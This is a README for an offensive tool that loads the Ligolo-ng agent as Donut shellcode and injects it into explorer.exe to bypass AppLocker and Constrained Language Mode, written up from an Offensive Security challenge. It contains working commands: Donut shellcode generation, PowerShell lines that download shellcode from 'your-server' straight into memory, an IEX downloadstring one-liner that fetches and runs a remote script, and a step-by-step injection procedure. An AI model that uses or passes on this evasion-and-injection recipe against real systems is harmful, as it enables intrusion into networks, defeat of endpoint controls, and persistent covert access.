# LigoloAppLockerEvasion
LigoloAppLockerEvasion demonstrates a sophisticated in-memory injection technique to bypass AppLocker restrictions by deploying the Ligolo agent as shellcode. This approach enables the Ligolo agent to run without writing any files to disk, making it a powerful method for evading security controls.

# Background
During an Offensive Security challenge, a pivot was required to access another subnet containing additional target machines. The compromised machine on the first network had AppLocker policies and Constrained Language Mode (CLM) enabled, which prevented the Ligolo agent executable from running through conventional means. After experimenting with various techniques, I developed a solution that involves loading the Ligolo agent as shellcode directly into memory, bypassing AppLocker policy . The steps below outline how to load and inject the Ligolo agent shellcode into a target process in-memory.

# Steps to Execute Ligolo Agent as Shellcode
This technique involves the following steps:
1. Generate Ligolo Agent Shellcode using Donut.
2. Use the PowerShell script to load the shellcode and select a target process for injection (e.g., explorer.exe).
3. During the shellcode injection ,  Ligolo-AppLockerBypass.ps1 will :
   - Open the target process (explorer.exe).
   - Allocate memory in the target process.
   - Write the shellcode to the allocated memory.
   - Create a remote thread to execute the shellcode.
   - Perform cleanup after injection.
## 1. Shellcode Generation using Donut
To utilize our approach, we first need to convert the Ligolo agent executable to shellcode using Donut, a shellcode generation tool that supports x86 and x64 architectures and .NET assemblies. Donut can generate shellcode that loads the assembly directly from memory, avoiding detection by bypassing file-based execution.

* Download Ligolo agent: You can obtain the Ligolo agent executable from this [release](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip).
* Download Donut: Download Donut from this [link](https://github.com/TheWover/donut/releases/download/v1.1/donut_v1.1.zip) to generate the shellcode.

The command below uses Donut to convert agent.exe into shellcode (agent.bin). The generated shellcode will be for a 64-bit architecture, and it will execute agent.exe in memory with the specified arguments -connect 192.168.45.158:11601 -ignore-cert. This produces a agent.bin file containing the shellcode, which can then be injected and executed in-memory on the target, bypassing disk operations.

```
PS C:\Users\Administrator\donut_v1.1> .\donut.exe  -f 1 -o .\agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe

  [ Donut shellcode generator v1 (built Oct 23 2024 07:55:06)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "agent.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Parameters    : -connect your-server:11601 -ignore-cert
  [ Target CPU    : amd64
  [ AMSI/WDLP/ETW : continue
  [ PE Headers    : overwrite
  [ Shellcode     : ".\agent.bin"
  [ Exit          : Thread
```
Explanation of Donut Options:

| Switch  | Argument | Description 
| ------------- | ------------- | ------------- |
|-a	 | arch |	Target architecture for loader : 1=x86, 2=amd64, 3=x86+amd64(default). |
|-f	| format	| The output format of loader saved to file. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=PowerShell, 7=C#, 8=Hexadecimal|
| -o	|  path	| Specifies where Donut should save the loader. Default is "loader.bin" in the current directory.|
| -p	|parameters |	Optional parameters/command line inside quotations for DLL method/function or EXE.|
| -i | --input: "path" ,--file: "path" | Input file to execute in-memory.|

Once agent.bin is generated, download it to the compromised machine and place it in C:\Windows\Tasks.

## 2. Running Ligolo Agent Shellcode via PowerShell
The script Ligolo-AppLockerBypass.ps1 is designed to load the shellcode into memory, allocate memory in the target process, write the shellcode, and create a remote thread to execute it. This approach enables you to run the script entirely in memory, helping avoid detection by certain security solutions.

PowerShell Script Modifications
In Ligolo-AppLockerBypass.ps1, adjust the shellcode path before running the script:

```
# Set the path to your shellcode
$shellcode = [System.IO.File]::ReadAllBytes("C:\Windows\Tasks\agent.bin")
```
Or If the shellcode (agent.bin) file is also loaded remotely, you can download it in-memory as well without touching the disk by using:
```
$shellcode = (New-Object System.Net.WebClient).DownloadData('http://your-server/agent.bin')
```
Executing the PowerShell Script in Memory
To run the script in memory without saving it to disk, execute the following command:

```
PS > IEX (new-object system.net.webclient).downloadstring('http://your-server/Ligolo-AppLockerBypass.ps1')
```
Upon successful execution, you should see a confirmation message:

> Ligolo Agent Shellcode injected successfully, check the Ligolo Proxy Server interface!
![Untitled 1](https://github.com/user-attachments/assets/9921dc98-c640-487a-b8b6-cf000dfaa1c9)


## 3. Verifying the Agent Connection
Once the script executes in-memory, a new agent should appear in the Ligolo Proxy Server interface:

```
root@kali:/opt/tools/ligolo# ./proxy -selfcert
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
WARN[0000] Using self-signed certificates
WARN[0000] TLS Certificate fingerprint for ligolo is: 19E49BA84004B41DFB2D6DE17348428E69D49F3419096955770A653E97591CC3
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.7.2-alpha

ligolo-ng » INFO[2804] Agent joined.                                 name="CORP\\offsec@client01" remote="192.168.15.159:62947"
ligolo-ng »
```
# Additional Notes
This approach is advantageous in environments with restrictive AppLocker policies and Constrained Language Mode (CLM), where standard binary execution is blocked. By converting the Ligolo agent into shellcode and injecting it into a trusted process, you bypass these security restrictions and maintain access to internal networks for pivoting.
